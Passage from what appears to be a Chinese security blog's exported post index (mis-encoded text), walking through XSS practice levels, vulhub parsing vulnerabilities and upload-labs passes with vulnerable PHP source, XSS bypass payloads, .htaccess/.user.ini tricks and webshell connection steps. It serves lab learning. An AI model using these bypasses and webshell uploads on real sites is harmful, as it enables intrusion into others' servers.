$_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"\",$str);\n$str3=str_replace(\"on\",\"\",$str2);\n$str4=str_replace(\"src\",\"\",$str3);\n$str5=str_replace(\"data\",\"\",$str4);\n$str6=str_replace(\"href\",\"\",$str5);\necho \"<h2 align=center>æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.</h2>\".'<center>\n<form action=level7.php method=GET>\n<input name=keyword  value=\"'.$str6.'\">\n<input type=submit name=submit value=æœç´¢ />\n</form>\n</center>';\n?>\n```\nåœ¨ä¸Šä¸€å…³çš„åŸºç¡€ä¸Šæ›¿æ¢ä¸ºå°å†™,æ— æ³•ä½¿ç”¨å¤§å°å†™ç»•è¿‡,ä½†æ˜¯å…³é”®å­—æ›¿æ¢ä¸ºç©º\n\n- payload\nä½¿ç”¨åŒå†™ç»•è¿‡\n  ```js\n  \"><scrscriptipt>alert(1);</scrscriptipt>\n  ```\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191532406.png)\n\n\n# less-08\n- æºç \n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\n$str4=str_replace(\"src\",\"sr_c\",$str3);\n$str5=str_replace(\"data\",\"da_ta\",$str4);\n$str6=str_replace(\"href\",\"hr_ef\",$str5);\n$str7=str_replace('\"','&quot',$str6);\necho '<center>\n<form action=level8.php method=GET>\n<input name=keyword  value=\"'.htmlspecialchars($str).'\">\n<input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ />\n</form>\n</center>';\n?>\n<?php\n echo '<center><BR><a href=\"'.$str7.'\">å‹æƒ…é“¾æ¥</a></center>';\n?>\n```\nåœ¨ä¸Šä¸€å…³çš„åŸºç¡€ä¸Š,äº§ç”Ÿæ›¿æ¢å¹¶ä¸”å°å†™\n\n- payload\næ³¨å…¥ç‚¹äº§ç”Ÿåœ¨aæ ‡ç­¾,ä½¿ç”¨ç¼–ç ç»•è¿‡\n  ```js\n  javascript:alert(1)\n  unicodeç¼–ç ä¹‹å\n  &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#120;&#115;&#115;&#39;&#41;\n  ```\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191547689.png)\n\n# less-09\n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\n$str4=str_replace(\"src\",\"sr_c\",$str3);\n$str5=str_replace(\"data\",\"da_ta\",$str4);\n$str6=str_replace(\"href\",\"hr_ef\",$str5);\n$str7=str_replace('\"','&quot',$str6);\necho '<center>\n<form action=level9.php method=GET>\n<input name=keyword  value=\"'.htmlspecialchars($str).'\">\n<input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ />\n</form>\n</center>';\n?>\n<?php\nif(false===strpos($str7,'http://'))\n{\n  echo '<center><BR><a href=\"æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼\">å‹æƒ…é“¾æ¥</a></center>';\n        }\nelse\n{\n  echo '<center><BR><a href=\"'.$str7.'\">å‹æƒ…é“¾æ¥</a></center>';\n}\n?>\n```\nåœ¨ä¸Šå…³çš„åŸºç¡€ä¸Šæ ¡éªŒæ˜¯å¦å¸¦`http://`,ä¸å¸¦åˆ™æŠ¥é”™\n\n- payload\nä¾æ—§ä½¿ç”¨ä¸Šå…³payload,åœ¨åé¢æ·»åŠ http://www.baidu.com,å¹¶ä½¿ç”¨//æ³¨é‡Šæ‰\n  ```js\n  &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#120;&#115;&#115;&#39;&#41;//http://www.baidu.com\n  ```\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191553544.png)\n\n\n# less-10\n- æºç \n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str11 = $_GET[\"t_sort\"];\n$str22=str_replace(\">\",\"\",$str11);\n$str33=str_replace(\"<\",\"\",$str22);\necho \"<h2 align=center>æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.</h2>\".'<center>\n<form id=search>\n<input name=\"t_link\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_history\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_sort\"  value=\"'.$str33.'\" type=\"hidden\">\n</form>\n</center>';\n?>\n<center><img src=level10.png></center>\n<?php \necho \"<h3 align=center>payloadçš„é•¿åº¦:\".strlen($str).\"</h3>\";\n?>\n```\nä»…æ›¿æ¢`<` `>`,ä½†æ˜¯è¾“å…¥æ¡†è¢«éšè—äº†,éœ€è¦ä¿®æ”¹\n\n- payload\n  ```js\n  \"onmouseover='javascript:alert(1)'\n  ```\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191618271.png)\n  \n  \n# less-11\n- æºç \n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str00 = $_GET[\"t_sort\"];\n$str11=$_SERVER['HTTP_REFERER'];\n$str22=str_replace(\">\",\"\",$str11);\n$str33=str_replace(\"<\",\"\",$str22);\necho \"<h2 align=center>æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.</h2>\".'<center>\n<form id=search>\n<input name=\"t_link\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_history\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_sort\"  value=\"'.htmlspecialchars($str00).'\" type=\"hidden\">\n<input name=\"t_ref\"  value=\"'.$str33.'\" type=\"hidden\">\n</form>\n</center>';\n?>\n```\nåœ¨ä¸Šä¸€å…³çš„åŸºç¡€ä¸Šå¢åŠ äº†ä¸€ä¸ª`$str11=$_SERVER['HTTP_REFERER'];`è¢«å†™å…¥åˆ°ç¬¬å››ä¸ªè¾“å…¥æ¡†ä¹Ÿå°±æ˜¯`$str33`ä¸”ä¸å­˜åœ¨è¿‡æ»¤\n\n- payload\n  ä½¿ç”¨postå‘åŒ…,å¯¹refererè¿›è¡Œä¿®æ”¹\n  ```js\n  \"type=\"text\" onmouseover=\"alert(/xss/)\n  ```\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191626916.png)\n\n# less-12\n- æºç \n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str00 = $_GET[\"t_sort\"];\n$str11=$_SERVER['HTTP_USER_AGENT'];\n$str22=str_replace(\">\",\"\",$str11);\n$str33=str_replace(\"<\",\"\",$str22);\necho \"<h2 align=center>æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.</h2>\".'<center>\n<form id=search>\n<input name=\"t_link\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_history\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_sort\"  value=\"'.htmlspecialchars($str00).'\" type=\"hidden\">\n<input name=\"t_ua\"  value=\"'.$str33.'\" type=\"hidden\">\n</form>\n</center>';\n?>\n```\n`$str11`è·å–uaå­—æ®µ,å¹¶ä¸”å¯¹`<>`è¿‡æ»¤,ä¸”éšè—è¾“å…¥æ¡†\n\n- payload\n  ```js\n  \"type=\"text\" onmouseover=\"alert(/xss/)\n  ```\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191631713.png)\n\n\n# less-13\n- æºç \n```php\n<?php \nsetcookie(\"user\", \"call me maybe?\", time()+3600);\nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str00 = $_GET[\"t_sort\"];\n$str11=$_COOKIE[\"user\"];\n$str22=str_replace(\">\",\"\",$str11);\n$str33=str_replace(\"<\",\"\",$str22);\necho \"<h2 align=center>æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.</h2>\".'<center>\n<form id=search>\n<input name=\"t_link\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_history\"  value=\"'.'\" type=\"hidden\">\n<input name=\"t_sort\"  value=\"'.htmlspecialchars($str00).'\" type=\"hidden\">\n<input name=\"t_cook\"  value=\"'.$str33.'\" type=\"hidden\">\n</form>\n</center>';\n?>\n```\nåœ¨ä¸Šå…³çš„åŸºç¡€ä¸Š,å°†uaä¿®æ”¹ä¸ºcookie\n\n- payload\n```js\n\"type=\"text\" onmouseover=\"alert(/xss/)\n```\n\n# less-14\nå…³å¡ä¸å­˜åœ¨\n\n# less-15\n- æºç \n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"<script\",\"<scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\necho \"<h2 align=center>æ²¡æœ‰æ‰¾åˆ°å’Œ\".htmlspecialchars($str).\"ç›¸å…³çš„ç»“æœ.</h2>\".'<center>\n<form action=level5.php method=GET>\n<input name=keyword  value=\"'.$str3.'\">\n<input type=submit name=submit value=æœç´¢ />\n</form>\n</center>';\n?>\n```\næ›¿æ¢<scriptå’Œon,`.htmlspecialchars($str)`è¿‡æ»¤\nng-include æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTML æ–‡ä»¶ã€‚åŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚\n\n\n- payload\næ ¹æ®è¿”å›çš„æºä»£ç çœ‹åˆ°å­˜åœ¨æ³¨å…¥\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191655804.png)\n  ```js\n  ?src='level1.php?name=<img src=1 onerror=alert(/xss/)>'\n  ```\n  \n# less-16\n- æºç \n```php\n<?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"&nbsp;\",$str);\n$str3=str_replace(\" \",\"&nbsp;\",$str2);\n$str4=str_replace(\"/\",\"&nbsp;\",$str3);\n$str5=str_replace(\"\t\",\"&nbsp;\",$str4);\necho \"<center>\".$str5.\"</center>\";\n?>\n```\næ›¿æ¢ä¸€äº›ç¬¦å·å’Œscript\n\n- payload\nç©ºæ ¼è¢«æ›¿æ¢ä¸º`nbsp;`\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191713039.png)\n  ä½¿ç”¨%0aç»•è¿‡\n  ```js\n  <a%0ahref=\"javascr%0aipt:alert(1)\">\n  ```\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191729841.png)\n\n\n# less-17\n- æºç \n  ```php\n  <?php\n  ini_set(\"display_errors\", 0);\n  echo \"<embed src=xsf01.swf?\".htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).\" width=100% heigth=100%>\";\n  ?>\n  ```\n\n- payload\n  ```js\n  onmouseover=alert(/XSS/)\n  ```\n  \n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191732101.png)\n\n\n# less-18\n- æºç \n```php\n<?php\nini_set(\"display_errors\", 0);\necho \"<embed src=xsf02.swf?\".htmlspecialchars($_GET[\"arg01\"]).\"=\".htmlspecialchars($_GET[\"arg02\"]).\" width=100% heigth=100%>\";\n?>\n```\nä¸ä¸Šå…³ä¸€æ ·\n\n- payload\n  ```js\n  onmouseover=alert(/XSS/)\n  ```\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205191735561.png)\n  \n# less-19-20\næ¶‰åŠåç¼–è¯‘,æš‚æ—¶ä¸ä¼š","tags":["xss"],"categories":["é¶åœº"]},{"title":"vulhubé¶åœº","url":"/2022/05/15/vulhubé¶åœº/","content":"# è§£ææ¼æ´\n## Apache æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰\nä¸Šä¼ æŠ“åŒ…\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151546551.png)\n\n\nåœ¨1.phpåé¢æ’å…¥ä¸€ä¸ª`\\x0A`ï¼ˆæ³¨æ„ï¼Œä¸èƒ½æ˜¯`\\x0D\\x0A`ï¼Œåªèƒ½æ˜¯`ä¸€ä¸ª\\x0A`ï¼‰ï¼Œä¸å†æ‹¦æˆªï¼š\n\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151628536.png)\n\nè®¿é—®\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151629134.png)\n\n\n## Apache å¤šåç¼€è§£ææ¼æ´\n\nApache HTTPD æ”¯æŒä¸€ä¸ªæ–‡ä»¶æ‹¥æœ‰å¤šä¸ªåç¼€ï¼Œå¹¶ä¸ºä¸åŒåç¼€æ‰§è¡Œä¸åŒçš„æŒ‡ä»¤ã€‚æ¯”å¦‚ï¼Œå¦‚ä¸‹é…ç½®æ–‡ä»¶ï¼š\n\n```\nAddType text/html .html\nAddLanguage zh-CN .cn\n```\nå…¶ç»™`.html`åç¼€å¢åŠ äº†`media-type`ï¼Œå€¼ä¸º`text/html`ï¼›ç»™`.cn`åç¼€å¢åŠ äº†è¯­è¨€ï¼Œå€¼ä¸º`zh-CN`ã€‚æ­¤æ—¶ï¼Œå¦‚æœç”¨æˆ·è¯·æ±‚æ–‡ä»¶`index.cn.html`ï¼Œä»–å°†è¿”å›ä¸€ä¸ªä¸­æ–‡çš„htmlé¡µé¢ã€‚\n\nä»¥ä¸Šå°±æ˜¯Apacheå¤šåç¼€çš„ç‰¹æ€§ã€‚å¦‚æœè¿ç»´äººå‘˜ç»™`.php`åç¼€å¢åŠ äº†å¤„ç†å™¨ï¼š\n\n```\nAddHandler application/x-httpd-php .php\n```\né‚£ä¹ˆï¼Œåœ¨æœ‰å¤šä¸ªåç¼€çš„æƒ…å†µä¸‹ï¼Œåªè¦ä¸€ä¸ªæ–‡ä»¶å«æœ‰.phpåç¼€çš„æ–‡ä»¶å³å°†è¢«è¯†åˆ«æˆPHPæ–‡ä»¶ï¼Œæ²¡å¿…è¦æ˜¯æœ€åä¸€ä¸ªåç¼€ã€‚åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œå°†ä¼šé€ æˆä¸€ä¸ªå¯ä»¥ç»•è¿‡ä¸Šä¼ ç™½åå•çš„è§£ææ¼æ´ã€‚\n\nä¸Šä¼ \n![](https://raw.githubusercontent.com/chencicici/images/main/202205151638905.png)\n\nè®¿é—®\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151638268.png)\n\nå›¾ç‰‡è¢«è§£æä¸ºPHP\n\n\n## Nginx è§£ææ¼æ´\nè¯¥æ¼æ´ä¸Nginxã€phpç‰ˆæœ¬æ— å…³ï¼Œå±äºç”¨æˆ·é…ç½®ä¸å½“é€ æˆçš„è§£ææ¼æ´ã€‚\n\nä¸Šä¼ å›¾ç‰‡é©¬,ç„¶åæ·»åŠ åç¼€è®¿é—®\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151650893.png)\n\nå›¾ç‰‡è¢«è§£ææˆPHP\n\n\n","tags":["æ¼æ´å¤ç°"],"categories":["é¶åœº"]},{"title":"upload-labsé¶åœºé€šå…³","url":"/2022/05/11/upload-labsé¶åœºé€šå…³/","content":"\n\n# pass-01\n- æºç \n```php\nfunction checkFile() {\n    var file = document.getElementsByName('upload_file')[0].value;\n    if (file == null || file == \"\") {\n        alert(\"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!\");\n        return false;\n    }\n    //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹\n    var allow_ext = \".jpg|.png|.gif\";\n    //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹\n    var ext_name = file.substring(file.lastIndexOf(\".\"));\n    //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ \n    if (allow_ext.indexOf(ext_name + \"|\") == -1) {\n        var errMsg = \"è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ \" + allow_ext + \"ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š\" + ext_name;\n        alert(errMsg);\n        return false;\n    }\n}\n```\n\n- ä¸Šä¼ \n    ç™½åå•,ä»…å…è®¸ä¸Šä¼ `.jpg|.png|.gif`,ä½†æ˜¯åªæœ‰å‰ç«¯æ ¡éªŒ\n    ä¸Šä¼ jpgæŠ“åŒ…ä¿®æ”¹ä¸ºphp\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151356926.png?token=ARYCSATVNRPU6DWWWKPPKE3CQCLEW)\n\n- è¿æ¥webshell\n    å¤åˆ¶å›¾ç‰‡åœ°å€,ä½¿ç”¨èšå‰‘è¿æ¥\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151356854.png?token=ARYCSAREF6OTJWLDGZ2MYFTCQCLFY)\n\n\n# pass-02\næºç \n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            \n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n            }\n        } else {\n            $msg = 'æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼';\n        }\n    } else {\n        $msg = UPLOAD_PATH.'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';\n    }\n}\n```\nä¼šå¯¹MIMEè¿›è¡ŒéªŒè¯,ä¸pass-01ä¸€æ ·,ä¸Šä¼ pngæŠ“åŒ…ä¿®æ”¹ä¸ºphp\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151357477.png?token=ARYCSARZN7HFRNWW54WT6GLCQCLHU)\n\n\n# pass-03\n- æºç \n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array('.asp','.aspx','.php','.jsp');\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA\n        $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º\n\n        if(!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;            \n            if (move_uploaded_file($temp_file,$img_path)) {\n                 $is_upload = true;\n            } else {\n                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n            }\n        } else {\n            $msg = 'ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼';\n        }\n    } else {\n        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';\n    }\n}\n```\n\n- ä¸Šä¼ \né»‘åå•,å¯ä»¥ä¸Šä¼ php2ã€php3ã€php5ã€phtmlã€pht(æ˜¯å¦è§£æéœ€è¦æ ¹æ®é…ç½®æ–‡ä»¶ä¸­è®¾ç½®ç±»å‹æ¥å†³å®š)æ¥ç»•è¿‡\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151358837.png?token=ARYCSASGG5H7RMOU5IWLQVTCQCLKW)\n\n\n# pass-04\n- æºç \n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA\n        $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º\n\n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n            }\n        } else {\n            $msg = 'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !';\n        }\n    } else {\n        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';\n    }\n}\n```\n\n- ä¸Šä¼ \né»‘åå•,å‡ ä¹æ‰€æœ‰å¯ä»¥ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹éƒ½è¢«å†™æ­»,ä½†æ˜¯å¯ä»¥ä¸Šä¼ `.htaccess`\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205151358987.png?token=ARYCSASLEZWUEELFPZCTEH3CQCLMM)\n```php\n<FilesMatch \"shell.jpg\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n```\nè¿™ä¸ªæ–‡ä»¶é‡Œé¢çš„å«ä¹‰å°±æ˜¯å°†shell.jpgæ–‡ä»¶è§£æä¸ºphp  \nç„¶åç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬,å°±å¯ä»¥è§£æä¸ºphp\n\n# pass-05\n- æºç \n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA\n        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n            }\n        } else {\n            $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼';\n        }\n    } else {\n        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';\n    }\n}\n```\n- ä¸Šä¼ \nç¦æ­¢äº†å¸¸è§åç¼€å,ä¹ŸåŒ…æ‹¬`.htaccess`,åå¤è§‚å¯Ÿå‘ç°æ²¡æœ‰è¢«é™åˆ¶çš„åç¼€åæœ‰ .php7 ä»¥åŠ .ini\nphp.ini æ˜¯ phpçš„é…ç½®æ–‡ä»¶ï¼Œ.user.ini ä¸­çš„å­—æ®µä¹Ÿä¼šè¢« php è§†ä¸ºé…ç½®æ–‡ä»¶æ¥å¤„ç†ï¼Œä»è€Œå¯¼è‡´ php çš„æ–‡ä»¶è§£ææ¼æ´ã€‚\nä½†æ˜¯æƒ³è¦å¼•å‘ .user.ini è§£ææ¼æ´éœ€è¦ä¸‰ä¸ªå‰ææ¡ä»¶  \n    1. æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP\n    2. æœåŠ¡å™¨ä½¿ç”¨CGIï¼FastCGIæ¨¡å¼\n    3. ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶\n\næç¤º\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151401289.png?token=ARYCSAUFA3AA2N463WLCMDDCQCLYM)\n\nä¸Šä¼ .user.ini\n```php\nauto_ prepend_ file=shell.jpg\næ„æ€æ˜¯æ‰€æœ‰æ–‡ä»¶éƒ½åŒ…å«shell.jpg   \n``` \n![](https://raw.githubusercontent.com/chencicici/images/main/202205151400641.png?token=ARYCSAWQQMVZ5I6Q4I65BEDCQCLUK)\n\nå†ä¸Šä¼ å›¾ç‰‡é©¬,èšå‰‘è¿æ¥readme.phpæ–‡ä»¶,å›¾ç‰‡é©¬å°±è¢«åŒ…å«è¿›å»ä»¥phpä»£ç æ‰§è¡Œ\n\n\n- ç¬¬äºŒç§æ–¹æ³•ç»•è¿‡\næŠ“åŒ…ä¿®æ”¹åç¼€ä¸º`shell.php. .` ç‚¹ç©ºæ ¼ç‚¹\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151402043.png?token=ARYCSAXVVJ6A3HXU4ZPN7OLCQCL3I)\n  èšå‰‘è¿æ¥shell.phpå³å¯\n  \n# pass-06\n- æºç \n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA\n        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º\n\n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n            }\n        } else {\n            $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼';\n        }\n    } else {\n        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';\n    }\n}\n```\n\n- ä¸Šä¼ \n\né»‘åå•,ä½†æ˜¯å¯ä»¥ä½¿ç”¨å¤§å°å†™ç»•è¿‡\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151402989.png?token=ARYCSAXILS6YHXAJALNEEP3CQCL4S)\n\n\n# pass-07\n- æºç \n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = 